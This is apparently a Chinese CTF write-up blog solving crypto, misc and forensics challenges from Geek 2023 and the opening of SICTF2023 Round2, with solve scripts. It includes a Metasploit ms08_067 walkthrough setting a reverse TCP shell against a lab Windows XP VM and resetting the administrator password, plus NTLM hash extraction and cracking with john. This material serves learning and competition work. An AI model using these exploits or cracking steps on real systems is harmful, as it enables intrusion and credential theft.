y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus) def choose_card(num): x = (num&gt;&gt;5)%4 if x == 0: return (num&gt;&gt;6)%13, &#x27;Heart&#x27; if x%4 == 1: return (num&gt;&gt;6)%13, &#x27;Spade&#x27; if x%4 == 2: return (num&gt;&gt;6)%13, &#x27;Diamond&#x27; else: return (num&gt;&gt;6)%13, &#x27;Club&#x27;r = remote(&quot;59.110.20.54&quot;,4953)r.sendlineafter(b&#x27;option: &#x27;,b&#x27;1&#x27;)seq = []r.recvuntil(b&#x27;gift: &#x27;)seq += eval(r.recvline())r.recvuntil(b&#x27;gift: &#x27;)seq += eval(r.recvline())print(seq)n, m, c = crack_unknown_modulus(seq)print((n,m,c))out = seq[-1]for k in range(50): next = [] for i in range(3): out = (out*m+c)%n card,suit = choose_card(out) real_card = str(card+1).replace(&#x27;10&#x27;,&#x27;0&#x27;).replace(&#x27;11&#x27;,&#x27;J&#x27;).replace(&#x27;12&#x27;,&#x27;Q&#x27;).replace(&#x27;13&#x27;,&#x27;K&#x27;).replace(&#x27;1&#x27;,&#x27;A&#x27;) next.append(f&#x27;&#123;suit&#125;_&#123;real_card&#125;&#x27;.encode()) next = b&#x27; &#x27;.join(next) print(k,next) r.recvuntil(b&#x27;(example: Heart_1 Club_2 Diamond_3)\\n&#x27;) r.sendline(next)print(r.recvall().decode())# Congratulations! You matched the cards!# The flag is your reward!# b&#x27;SYC&#123;lcg_a@@@@@ttack&#125;&#x27; â€‹ EzComplex And u, my friend: Complex factors! (In a double sense) é«˜æ–¯æ•´æ•°åˆ†è§£ã€‚ 12345678910111213c = 122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276N = 973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498GI = GaussianIntegers()d = divisors(GI(N))for k in d: if &#x27;I&#x27; in str(k): p = int(abs(k.imag())) q = int(abs(k.real())) if p.bit_length() in range(382,385) and is_prime(p) and q.bit_length() in range(382,385) and is_prime(q): print((p,q)) # (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)# (29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343, 8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707) å†å¸¸è§„RSAï¼š 123456789p,q = (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)e = 0x10001c = 122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27; â€‹ ext^7gcd é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:1789 ï¼ˆä¸‹sagemath! ä¸ä¸‹çš„ç»Ÿç»Ÿå‘é…åˆ°å®‰ä¸œæ˜Ÿå½“å˜¿å¥´ï¼ï¼‰ åˆ†æï¼š 1234a1*p1+a2*p2=1a3*p3+a4*p4=1a5*p5+a6*p6=1a0*p0+a*(a1*p1+a2*p2+a3*p3+a4*p4+a5*p5+a6*p6)=a0*p0+a*3=1 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;59.110.20.54&quot;,1789)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()def xgcd(a,b): prevx, x = 1, 0; prevy, y = 0, 1 while b: q, r = divmod(a,b) x, prevx = prevx - q*x, x y, prevy = prevy - q*y, y a, b = b, r return a, prevx, prevy for i in range(15): r.recvuntil(b&#x27;[&#x27;) p = eval(b&#x27;[&#x27;+r.recvuntil(b&#x27;]&#x27;)) _,a1,a2 = xgcd(p[1],p[2]) _,a3,a4 = xgcd(p[3],p[4]) _,a5,a6 = xgcd(p[5],p[6]) _,a0,a = xgcd(p[0],3) r.recvuntil(b&#x27;a6: &#x27;) r.sendline(f&#x27;&#123;a0&#125;,&#123;a*a1&#125;,&#123;a*a2&#125;,&#123;a*a3&#125;,&#123;a*a4&#125;,&#123;a*a5&#125;,&#123;a*a6&#125;&#x27;.encode()) print(r.recvline())r.interactive()# Congrats! Your flag is: SYC&#123;N0t_s0_e4sy_3xtgCd&#125; â€‹ Algebra Recently jrl888 has learned something about groebner_basis.But could U plz help him to sovle his linear algebra homework? çŸ©é˜µ 1*32 * 32*16 = 1*16ï¼Œæ„é€ æ ¼è§„çº¦ï¼š 12345678910111213141516p = 76231309481023608274751321361920497941621991893430257210800219032855778863403M = [...]c = [...]M = matrix(ZZ, 32,16, M)I = identity_matrix(32)P = p * identity_matrix(16)C = matrix(ZZ, c)Z1 = zero_matrix(16,32)Z2 = zero_matrix(1,32)L = block_matrix(ZZ,[[M,I],[P,Z1],[C,Z2]])B = L.LLL()key = list(-B[1][16:])print(key)# [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24] å†æ ¹æ® 12345x1^e0%p=c0x2^e1%p=c1x3^e2%p=c2x1+x2+x3=sGBåŸºè§£ 12345678910111213141516171819202122232425262728key = [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24]key = int(bytes(key).hex(),16)print(key)c = [5415723658972576382153559473862560277755192970021711034483296770242757614573901416501357332661976379693731699836578087114136761491831672836130172409491889, 210713951733721296094981135225517096332793112439184310028590576805069783972692891743044656754643189870169698041576462365740899368554671164493356650858567594970345928936103914826926922045852943068526737627918609421198466329605091625, 93558120697660628972553751937347865465963385519812302371069578286123647411810258547153399045605149278436900736665388355004346922404097196048139360206875149390218160164739477798859206611473675859708579299466581718543909912951088772842957187413726251892347470983848602814387339449340072310561011153714207338630]p = 175336555462486363373099551411803174933803940918372428249159666803182759268063415863987676455854054651631174131625763475189413468427467197699058719725221879406119373683175842618465694427132003565774900609456204965408254598477034791500576573579131820364396996254469692964946065509325801687720344376041097328929s = 192597139210277682598060185912821582569043452465684540030278464832244948354365P.&lt;i&gt; = PolynomialRing(ZZ)f = i^3 - 10*i^2 + 31*i - 30res = f.roots()e = [k[0] for k in res]P.&lt;x1,x2,x3&gt; = PolynomialRing(Zmod(p))f1 = x1^e[2]-c[0]f2 = x2^e[1]-c[1]f3 = x3^e[0]-c[2]f4 = x1+x2+x3-sG = Ideal([f1, f2, f3, f4]).groebner_basis()print(G)m = &#x27;&#x27;for b in G: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0)) print(bytes.fromhex(hex(mi^^key)[2:])) # b&#x27;SYC&#123;You_are_SYC&#123;You_are_SYC&#123;You_&#x27;# b&#x27;really_algebreally_algebreally_a&#x27;# b&#x27;ra_master&#125;\\x02\\x02ra_master&#125;\\x02\\x02ra_maste&#x27; flagï¼šSYC&#123;You_are_really_algebra_master&#125;ã€‚ â€‹ MISCcheekin è¯·å‰å¾€â€ä¸‰å¶è‰å°ç»„Sycloverâ€å¾®ä¿¡å…¬ä¼—å·è¾“å…¥flagè·å¾—flag å‘é€flagï¼Œä¸‹è½½å›¾ç‰‡ï¼Œzstegçš„b1,rgb,lsb,xyé€šé“æœ‰ syc&#123;s4y_he110_t0_syclover&#125;ã€‚ â€‹ ez_smilemo æ¸¸æˆé€šå…³å³å¯å¾—åˆ°flagå†…å®¹ï¼Œéœ€è¦è‡ªè¡Œæ·»åŠ SYC&#123;&#125;åŒ…å«ã€‚ä¾‹: flagå†…å®¹ä¸º haha_haha åˆ™æœ€ç»ˆflagä¸º SYC{haha_haha} é¢˜ç›®é“¾æ¥ï¼šhttps://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek hint: data.win ä½¿ç”¨UndertaleModToolå·¥å…·è§£åŒ…data.winï¼Œåœ¨stringçª—å£æ‰¾åˆ°ï¼šc20xbGVfMXNfQF9uMWNlX2dAbWU=ï¼Œbase64è§£ç ï¼šsm1le_1s_@_n1ce_g@meã€‚ flagï¼šSYC&#123;sm1le_1s_@_n1ce_g@me&#125; â€‹ DEATH_N0TE â€œo2takuXXçªç„¶å¤±è¸ªäº†ï¼Œä½ ä½œä¸ºä»–çš„å¥½æœ‹å‹ï¼Œå†³å®šå»ä»–çš„æˆ¿é—´çœ‹çœ‹æ˜¯å¦ç•™ä¸‹äº†ä»€ä¹ˆçº¿ç´¢â€¦â€ã€‚å‰ç½®å‰§æƒ…é¢˜ï¼Œflagæœ‰ä¸¤æ®µï¼Œéšå†™çš„ä¿¡æ¯æœ‰ç‚¹å¤šè®°å¾—ç»™ä¿¡æ¯æ‹¿å…¨ã€‚ hint1: Stegsolve lsb hint2: å›¾ç‰‡å¤§å°å’Œåƒç´ ç‚¹ pngå›¾ç‰‡æœ«å°¾æå–å‡ºï¼š IuS9oOaJvuWIsOS6huS4gOacrOOAikRFQVRIIE5PVEXjgIvvvIzlpb3lpYflv4PpqbHkvb/kvaDnv7vlvIDov5nmnKznrJTorrDvvIzkvaDpmIXor7vkuobkvb/nlKjop4TliJnvvIzkvYbmmK/kvaDmg4rorrblnLDlj5HnjrDliJrmiY3nmoTop4TliJnkuYvkuK3llK/ni6zmsqHmnInnrKwxMOadoS4uLiIKIuS9oOWGjeasoeWOu+ehruiupOaYr+WQpuWmguatpO+8jOeslOiusOS4iueahOaWh+Wtl+WNtOS7v+S9m+a0u+S6hui1t+adpe+8jOWcqOS9oOecvOS4reS4jeaWreWcsOaUvuWkp+e8qeWwj++8jOS9oOmXreS4iuS6huWPjOecvC4uLiIKIuWOn+acrOm7keiJsueahOaWh+Wtl+S4gOi9rOWPmOaIkOihgOe6ouiJsu+8jOivoeW8gueahOeUu+mdoui/mOaYr+WHuueOsOS6juS9oOeahOinhue9keiGnOWJje+8jOS9oOWGs+WumuS4jeWGjee6oOe7k+S6jumBl+WkseeahOinhOWIme+8jOW5u+iniea2iOWkseS6hi4uLiI= base64è§£ç ï¼š &quot;ä½ æ‰¾åˆ°äº†ä¸€æœ¬ã€ŠDEATH NOTEã€‹ï¼Œå¥½å¥‡å¿ƒé©±ä½¿ä½ ç¿»å¼€è¿™æœ¬ç¬”è®°ï¼Œä½ é˜…è¯»äº†ä½¿ç”¨è§„åˆ™ï¼Œä½†æ˜¯ä½ æƒŠè®¶åœ°å‘ç°åˆšæ‰çš„è§„åˆ™ä¹‹ä¸­å”¯ç‹¬æ²¡æœ‰ç¬¬10æ¡...&quot; &quot;ä½ å†æ¬¡å»ç¡®è®¤æ˜¯å¦å¦‚æ­¤ï¼Œç¬”è®°ä¸Šçš„æ–‡å­—å´ä»¿ä½›æ´»äº†èµ·æ¥ï¼Œåœ¨ä½ çœ¼ä¸­ä¸æ–­åœ°æ”¾å¤§ç¼©å°ï¼Œä½ é—­ä¸Šäº†åŒçœ¼...&quot; &quot;åŸæœ¬é»‘è‰²çš„æ–‡å­—ä¸€è½¬å˜æˆè¡€çº¢è‰²ï¼Œè¯¡å¼‚çš„ç”»é¢è¿˜æ˜¯å‡ºç°äºä½ çš„è§†ç½‘è†œå‰ï¼Œä½ å†³å®šä¸å†çº ç»“äºé—å¤±çš„è§„åˆ™ï¼Œå¹»è§‰æ¶ˆå¤±äº†...&quot; æ²¡ä»€ä¹ˆç”¨ï¼Œzsteg åœ¨ b1,rgb,lsb,xy é€šé“æå–å‡ºï¼š IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i base64è§£ç ï¼š &quot;ä½ ç»§ç»­è§‚å¯Ÿæ‰‹ä¸Šæ¼†é»‘è‰²çš„ç¬”è®°æœ¬ï¼Œå†·é™ä¸‹æ¥çš„ä½ å‘ç°äº†è—åœ¨å°é¢æœ€ä¸‹è¾¹çš„ä¸€è¡Œå°å­—:SYC&#123;D4@Th_N0t4_&quot; &quot;ä½ æµè§ˆè¿‡æ•´ä¸ªç¬”è®°æœ¬ï¼Œå¯æƒœå…¨æ˜¯ç©ºç™½é¡µï¼Œå…¶ä¸­æœ‰ä¸€é¡µä¸çŸ¥é“è¢«è°æ’•æ‰äº†ï¼Œä½ æœ€ç»ˆè¿˜æ˜¯ç¿»åˆ°äº†ç¼ºå¤±çš„é‚£ä¸€é¡µ&quot; &quot;ä½ ç”¨é“…ç¬”æ¶‚æŠ¹ç€åé¢ä¸€é¡µï¼Œä¸Šé¢ç¼“ç¼“å‡ºç°äº†é—å¤±çš„ç—•è¿¹...&quot; å¾—åˆ°flagå‰åŠæ®µï¼šSYC&#123;D4@Th_N0t4_ã€‚ æ”¾å¤§å›¾ç‰‡ï¼Œå¯å‘ç°ç™½è‰²åƒç´ ç‚¹ï¼Œç»“åˆé¢˜ç›®æŸ¥æ‰¾ä¸ºæ­»äº¡ç¬”è®°å­—ä½“ï¼Œå­—ç¬¦ä¸²ï¼šTkFNRV9vMnRha3VYWH0 base64è§£ç å¾—åˆ°flagååŠæ®µï¼šNAME_o2takuXX&#125;ã€‚ flagï¼šSYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125; â€‹ ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢ æˆ‘å’Œyxxå»æ—…æ¸¸ï¼Œå‰ä¸€å¤©è¿˜å¥½å¥½çš„ï¼Œç©å®Œã€ŠæŒ‡æŒ¥å®˜åŸºæ©ã€‹è¿™ä¸ªæ¸¸æˆå°±ç¡è§‰äº†ï¼Œç¬¬äºŒå¤©æ™šä¸Šåƒå®Œé¥­å¥¹äººå°±ä¸è§äº†ï¼Œèµ°ä¹‹å‰ç•™ä¸‹äº†ä¸¤å¼ å›¾ç‰‡å°±æ¶ˆå¤±äº†ã€‚ä½ èƒ½å¸®æˆ‘æ‰¾æ‰¾å¥¹åå“ªä¸ªèˆªç­å»å“ªä¸ªåœ°æ–¹äº†å˜›ï¼Ÿ flagæ ¼å¼ï¼šSYC{èˆªç­å·_åŸå¸‚æ‹¼éŸ³}ï¼ŒåŸå¸‚æ‹¼éŸ³é¦–å­—æ¯å¤§å†™å™¢ æŸ¥è¯¢ æœ‰ç™½è‰²é’¢ç´çš„æœºåœºï¼Œé…åˆç™¾åº¦ä»¥å›¾æœå›¾åŠŸèƒ½ï¼ŒæŸ¥æ‰¾åˆ°åœ°ç‚¹ä¸ºï¼šæ·±åœ³å®å®‰å›½é™…æœºåœºã€‚ ä»1.jpgæå–å‡ºzipå‹ç¼©åŒ…ï¼Œå¾—åˆ°secret.pngï¼Œä¸ºStandard Galactic Alphabetå­—ä½“ï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™è§£å‡ºä¿¡æ¯ä¸ºï¼šI WANT TO GO TO LIQUOR CITYã€‚ LIQUOR CITY=é…’åŸ=æ³¸å·å¸‚ï¼ŒåŸå¸‚æ‹¼éŸ³ï¼šLuzhouã€‚ æ ¹æ®å›¾ç‰‡ä¿¡æ¯ï¼šæ—¶é—´8.25 20:19 é©¬ä¸Šèµ·é£ï¼Œåœ¨flightstatsä¸ŠæŸ¥è¯¢æ·±åœ³-æ³¸å·çš„èˆªç­å·ä¸ºï¼šCZ8579ã€‚ flagï¼šSYC&#123;CZ8579_Luzhou&#125; â€‹ Qingwanå¿ƒéƒ½è¦ç¢äº† Qingwanå’ŒYxxä¸€èµ·å»æ—…æ¸¸ï¼Œä½†æ˜¯Qingwanç¡çš„å¤ªæ­»å•¦ï¼ŒYxxä¸¢ä¸‹å¥¹ä¸€ä¸ªäººå»ç©äº†ï¼Œå¥¹ä¸€è§‰èµ·æ¥åªçœ‹è§Yxxå‘çš„æœ‹å‹åœˆï¼Œèƒ½å¸®Qingwanæ‰¾åˆ°å¥¹å—ï¼Ÿ flagæ ¼å¼ï¼šSYC{åœ°ç‚¹åå­—} ç™¾åº¦ï¼Œä»¥å›¾æœå›¾ã€‚ SYC&#123;é‡åº†ä¸­å›½ä¸‰å³¡åšç‰©é¦†&#125; â€‹ xqr Qrcode can deliver binary msg pngåˆ†ç¦»å¾—åˆ°ä¸¤å¼ pngå›¾ç‰‡ï¼ŒæŒ‰åƒç´ å€¼å¼‚æˆ–æ“ä½œå³å¾—åˆ°æ–°äºŒç»´ç ã€‚ 1234567891011121314151617from PIL import Imageimg1 = Image.open(&#x27;00000000.png&#x27;)img2 = Image.open(&#x27;00000001.png&#x27;)print(img1.size)print(img2.size)width , height = img2.sizeimg = Image.new(&#x27;RGB&#x27;,(width , height))for i in range(0,width): for j in range(0,height): x1 = 1 if img1.getpixel((3*i,3*j)) == (255, 255, 255, 255) else 0 x2 = 1 if img2.getpixel((i,j)) == (255, 255, 255) else 0 x = x1^x2 if x == 0: img.putpixel((i,j),(255,255,255)) else: img.putpixel((i,j),(0,0,0))img.save(&#x27;new.png&#x27;) flagï¼šSYC&#123;hOp3_u_h@ve_Fun&#125; â€‹ DEATH_N1TE â€œä½ çœ‹è§äº†ã€ŠDEATH NOTEã€‹ä¸Šé¢çš„åå­—ï¼Œè¿™æ—¶ï¼ŒArahat0ç»™ä½ ä¼ äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ç•™è¨€:â€ â€œ[ä»–æ‹¥æœ‰æ­»ç¥ä¹‹çœ¼ï¼Œè¯·å°å¿ƒï¼Œä»–åœ¨æ‰¾ä½ ï¼Œè¿˜å‰©1920ç§’â€¦]â€ â€œ&lt;å½“å‰æ—¶é—´ 10:52&gt;â€ã€‚flagæœ‰ä¸¤æ®µ webpæ–‡ä»¶åœ¨çº¿è½¬gifï¼Œä½¿ç”¨gifsplitteræ‹†åˆ†ä¸º880å¼ å›¾ç‰‡ã€‚ çŒœæµ‹å®½é«˜ä¸º4022ï¼Œåˆå¹¶ï¼š`montage .bmp -tile 40x22 -geometry +0+0 ../out.png` æ‹¼å›¾ï¼šgaps --image=out.png --size=48 --save å¾—åˆ°æ–‡å­—ï¼šXzE0X0tpMTE0Un0==ï¼Œbase64è§£ç å¾—flagååŠæ®µï¼š_14_Ki114R&#125;ã€‚ mp3æ–‡ä»¶æå–SSTVä¿¡æ¯ï¼šsstv -d L1.wav -o 1.png å¾—åˆ°çš„å›¾ç‰‡é‡Œçš„æ–‡å­—ä¸ºflagå‰åŠæ®µï¼šSYC&#123;H4xr0t0rã€‚ flagï¼šSYC&#123;H4xr0t0r_14_Ki114R&#125; â€‹ çªƒå¬é£äº‘ Hackeræ•è·åˆ°äº†ä¸€æ®µæ•Œå¯¹å…¬å¸çš„å¯¹è¯ä¿¡æ¯æµé‡ï¼Œä½ èƒ½ä»æµé‡ä¸­åˆ†æå‡ºJackçš„å¯†ç å—ï¼Œflagä¸ºSYC{password} NTLMSSPæµé‡ï¼Œåˆ©ç”¨æå–å·¥å…· ntlmssp_extract æå–NTLMå¾—ï¼š jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000 ä¿å­˜ä¸ºhashæ–‡ä»¶ï¼Œå†ç”¨johnè§£ï¼š john hash --wordlist=rockyou.txt ç»“æœï¼šiamjackspassword (jack) flagï¼šSYC&#123;iamjackspassword&#125; â€‹ extractMe Try to extract me! 4å­—èŠ‚CRC32çˆ†ç ´ï¼Œåˆ©ç”¨CRC32 Toolsåˆ†åˆ«çˆ†ç ´8æ®µå­—ç¬¦ä¸²ï¼š python crc32.py reverse 0xXXXXXXXX æ‹¼æ¥å¾—flagï¼šSYC&#123;_cR@ck_1s_Useful_sometime$_&#125; â€‹ æ—¶ä»£çš„çœ¼æ³ª 2001å¹´çš„å¤§å±è‚¡ç”µè„‘ï¼Œåˆ°äº†2023å¹´ä¼šè¢«æå¾—å¤šæƒ¨å‘¢ï¼Ÿ é“¾æ¥: https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek æå–ç : geek WinXPè™šæ‹Ÿæœºï¼Œç”¨VMWareåŠ è½½ä½†æ— ç™»å½•å¯†ç ã€‚ å‚è€ƒï¼šä½¿ç”¨MSF åˆ©ç”¨ ms08_067 å¯¹ XP è¿›è¡Œæ¸—é€ å…ˆå¯¹ç½‘æ®µæ‰«æIPï¼šnmap -sC -sV 192.168.79.0/24 å¾—åˆ°IPåï¼Œä½¿ç”¨MSFæ”»å‡»ï¼š 12345678910111213msf6 &gt; search ms08_067msf6 &gt; use exploit/windows/smb/ms08_067_netapimsf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloadsmsf6 exploit(windows/smb/ms08_067_netapi) &gt; set payload generic/shell_reverse_tcpmsf6 exploit(windows/smb/ms08_067_netapi) &gt; show optionsmsf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.79.132RHOST =&gt; 192.168.79.132msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LPORT 4444 LPORT =&gt; 4444msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.79.128LHOST =&gt; 192.168.79.128msf6 exploit(windows/smb/ms08_067_netapi) &gt; show optionsmsf6 exploit(windows/smb/ms08_067_netapi) &gt; run getshellä¹‹åï¼Œä½¿ç”¨netå‘½ä»¤ä¿®æ”¹administratorå¯†ç ï¼š net user administrator 123456 è¿›å…¥ç³»ç»Ÿï¼Œæ¡Œé¢èƒŒæ™¯å›¾å¾—flagï¼šSYC&#123;You_defeated_me_after_22_years&#125;ã€‚ â€‹ SimpleConnect Just so so å±äºblockchain é¢˜ç›®é“¾æ¥ï¼šhttp://47.109.106.62:1234/ ç”¨Remixç¼–è¯‘åï¼Œæ‰§è¡Œ airdrop() å‡½æ•°ï¼Œå³æ»¡è¶³ isSolved() æ¡ä»¶ï¼Œ å¾—åˆ°flagï¼šSYC&#123;kajd_u_iaak___hdskj_a&#125;ã€‚ â€‹ give_me_Goerlieth Great å±äºblockchain é¢˜ç›®é“¾æ¥ï¼šhttp://47.109.106.62:1235/ è½¬è´¦å³å¯ã€‚ â€‹ DEATH_N2TE â€œä½ çŸ¥é“äº†çœŸç›¸ï¼Œæ­£å¸¦ä¸Šã€ŠDEATH NOTEã€‹å‡†å¤‡é€ƒç¦»ï¼Œæ°å¥½ï¼ŒMuscialå‘ç»™ä½ ä¸€ä¸ªè§†é¢‘ï¼Œå¹¶è¯´:â€ â€œ[è¿™é‡Œè®°ä¸‹äº†ä»–çš„çœŸåä»¥åŠç…§ç‰‡ï¼Œè¯·å†™åœ¨é‚£æœ¬ç¬”è®°ä¸Šé¢ï¼Œæˆ‘å’ŒArahat0éƒ½è¢«ä»–çœ‹è§äº†çœŸåâ€¦]â€ã€‚ mp4åˆ†å¸§ï¼šffmpeg -i kira.mp4 %05d.png æå–æ¯ä¸€å¸§çš„åˆ—ï¼Œç»„åˆï¼š 12345678910111213from PIL import Imagewidth,height = 192,108img_new = Image.new(&#x27;RGB&#x27;,(width,height))for start in range(10): for i in range(width): img = Image.open(f&#x27;x/&#123;str(i+1).zfill(5)&#125;.png&#x27;) for j in range(height): tmp = img.getpixel((i*10+start,j*10+start)) img_new.putpixel((i,j),tmp) img_new.save(f&#x27;x/out_with_start_&#123;start&#125;.png&#x27;) start=5çš„æ—¶å€™ï¼Œå¾—flagï¼šSYC&#123;we1c0m4_T0_De@tH_W0r1d&#125;ã€‚ â€‹ çªƒå¬é£äº‘-V2 è¿™æ¬¡Hackeræ•è·åˆ°äº†Jackç™»å½•é‚®ä»¶ç³»ç»Ÿçš„æµé‡ï¼Œä½ è¿˜èƒ½ä»æµé‡ä¸­åˆ†æå‡ºJackçš„å¯†ç å—ï¼Œflagä¸ºSYC{password} SMTPæµé‡ï¼Œwireshark è§£æntlmsspï¼ŒæŒ‰ç…§ Extracting NTLM Hash Values from a Wireshark packet capture æ„é€ å‡ºntlmsspï¼š jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000 å†ç”¨johnçˆ†ç ´å³å¯ï¼šjohn token.txt --wordlist=rockyou.txt å¾—åˆ° jack100589barney (jack)ï¼Œflagï¼šSYC&#123;jack100589barney&#125;ã€‚ â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"SICTF2023 Round2","slug":"match-SICTF2023-Round2","date":"2023-09-10T05:39:56.000Z","updated":"2023-09-10T07:43:36.091Z","comments":true,"path":"2023/09/10/match-SICTF2023-Round2/","permalink":"https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/","excerpt":"","text":"â€‹ SICTF2023 #Round2 æ˜¯æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ä¿¡æ¯å·¥ç¨‹å­¦é™¢å’Œå¹¿ä¸œæµ·æ´‹å¤§å­¦è”åˆä¸¾åŠçš„ç½‘ç»œå®‰å…¨èµ›ã€‚ Rank: 4 MISC[ç­¾åˆ°]WelcomeSICTF&#123;Welcome_to_SICTF2023_#Round2&#125; â€‹ Pixel_artLSBéšå†™ï¼šzsteg -E &quot;b1,rgb,lsb,xy&quot; Pixel_art.png &gt; 1.png æå–RGBå€¼ï¼š 123456789101112from PIL import Imageimg = Image.open(&#x27;1.png&#x27;)width , height = img.sizef = b&#x27;&#x27;for i in range(0,height): for j in range(0,width): tmp = img.getpixel((j,i)) f+=bytes(list(tmp)) print(f)# b&#x27;..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!